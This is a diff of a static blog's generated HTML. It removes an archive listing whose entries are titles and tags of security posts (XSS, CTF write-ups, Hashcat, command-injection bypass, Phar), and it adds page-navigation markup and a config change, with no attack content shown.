+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/xss总结/">xss总结</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/XSS-Thousand-Knocks解题记录/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:13:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/XSS-Thousand-Knocks解题记录/">XSS-Thousand-Knocks解题记录</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/Hashcat的使用手册总结/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:12:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/Hashcat的使用手册总结/">Hashcat的使用手册总结</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/Bypass一些命令注入限制的姿势/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:12:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/Bypass一些命令注入限制的姿势/">Bypass一些命令注入限制的姿势</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/Phar的一些利用姿势/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:11:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/Phar的一些利用姿势/">Phar的一些利用姿势</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/Code-Breaking-Puzzles做题记录/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:09:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/Code-Breaking-Puzzles做题记录/">Code-Breaking-Puzzles做题记录</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -502,8 +421,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
